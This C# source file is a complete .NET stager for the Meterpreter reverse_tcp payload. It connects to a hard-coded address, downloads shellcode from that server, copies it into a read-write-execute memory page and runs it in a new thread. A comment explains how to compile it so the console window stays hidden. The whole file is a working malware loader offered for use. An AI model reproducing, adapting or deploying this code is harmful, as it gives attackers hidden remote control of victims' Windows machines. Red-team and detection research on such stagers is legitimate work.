using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;

/*
 * 
 * .NET/C# implementation of the windows/meterpreter/reverse_tcp payload.
 * 
 * Note: to execute with a hidden console, set 'Project' -> Project Properties -> 'Output Type' to "Windows Appliation"
 *       and recompile.
 * 
 * By: @harmj0y
 *
 */

namespace Payload
{
    class Program
    {

        static void Main()
        {
            IPEndPoint ip = new IPEndPoint(IPAddress.Parse("192.168.30.129"), 80);
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                sock.Connect(ip);
            }
            catch (SocketException e)
            {
                return;
            }

            byte[] length_raw = new byte[4];

            // receive our 4 byte length from the server
            sock.Receive(length_raw, 4, 0);

            // convert the binary data to an integer length
            int length = BitConverter.ToInt32(length_raw, 0);
            byte[] shellcode = new byte[length + 5];

            int total_bytes = 0;

            // make sure we receive all of the payload
            while (total_bytes < length)
            {
                byte[] buffer = new byte[length];
                int bytes_received = sock.Receive(buffer);

                // copy the temp byte[] into our shellcode array
                Array.Copy(buffer, 0, shellcode, 5 + total_bytes, bytes_received);
                total_bytes += bytes_received;
            }

            // get the socket handle
            byte[] handle = BitConverter.GetBytes((int)sock.Handle);

            // copy the socket handle into the shellcode
            Array.Copy(handle, 0, shellcode, 1, 4);
            shellcode[0] = 0xBF; // little assembly magic to push the socket # into EDI

            // allocate a RWX page
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            // copy the shellcode into the page
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

            // prepare data
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
                              UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(

          string moduleName

          );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(

          IntPtr hModule,
          string procName

          );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(

          string lpFileName

          );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();

    }
}

